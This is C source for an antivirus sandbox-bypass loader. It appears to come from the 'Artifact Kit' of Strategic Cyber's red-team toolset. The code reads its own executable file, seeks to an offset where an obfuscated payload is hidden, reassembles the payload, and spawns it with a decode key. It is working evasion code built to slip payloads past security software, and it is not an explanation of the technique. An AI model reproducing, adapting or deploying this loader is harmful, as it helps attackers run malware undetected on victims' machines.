/*
 * Artifact Kit - A means to disguise and inject our payloads... *pHEAR*
 * (c) 2014 Strategic Cyber LLC
 *
 * See http://www.advancedpentest.com/license
 *
 * A/V sandbox bypass with file operations
 *
 * Strategy - open the current file for reading. Skip ahead to
 *            where the obfuscated payload is stored. Read it
 *            and then spawn it.
 */

#include <windows.h>
#include <stdio.h>
#include "patch.h"

void start(HINSTANCE mhandle) {
	phear * payload = (phear *)data;

	/* get the name of this file */
	char * name = (char *)malloc(sizeof(char) * 2048);
	GetModuleFileName(mhandle, name, sizeof(char) * 2048);

	/* read in the file and seek to a particular point */
	FILE * handle = fopen(name, "rb");

	/* seek to the place in the file where our data begins */
	fpos_t offset = (fpos_t)payload->offset;
	fsetpos(handle, &offset);

	/* retrieve and decode the payload 1 byte at a time. */
	char * buffer = (char *)malloc(payload->length);
	int read = fread((void *)buffer, sizeof(char), payload->length, handle);
	fclose(handle);

	/* complete the rest of the silly payload */
	int x;
	for (x = read; x < payload->length; x++) {
		buffer[x] = payload->payload[x];
	}

	/* spawn our thread with the goodies */
	spawn(buffer, payload->length, payload->key);
}
